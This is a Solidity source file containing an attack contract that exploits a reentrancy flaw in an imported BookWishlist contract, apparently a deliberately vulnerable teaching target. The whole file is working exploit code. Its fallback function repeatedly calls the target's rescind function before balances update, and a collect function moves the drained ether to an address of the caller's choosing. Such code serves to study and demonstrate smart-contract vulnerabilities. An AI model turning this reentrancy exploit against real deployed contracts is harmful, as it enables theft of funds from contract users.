pragma solidity ^0.4.18;

import "./BookWishlist.sol";

/*
 * This contract is constructed to take advantage of a Reentrancy
 * flaw built into BookWishlist. It allows an attacker to completely
 * drain the contract.
 */
contract ReenterWishlist {
    BookWishlist target;

    function ReenterWishlist(address _t) public {
        target = BookWishlist(_t);
    }

    /*
     * Sends the target a contribution and immediately recinds it
     */
    function trigger(uint i) public payable {
        target.contribute.value(msg.value)(i);
        target.rescind(0);
    }

    /*
     * Collects earnings from function.
     */
    function collect(address _me) public {
        _me.transfer(this.balance);
    }

    /*
     * When the target refunds the ether, recursively call recind again before
     * balance is updated.
     */
    function () public payable {
        target.rescind(0);
    }
}
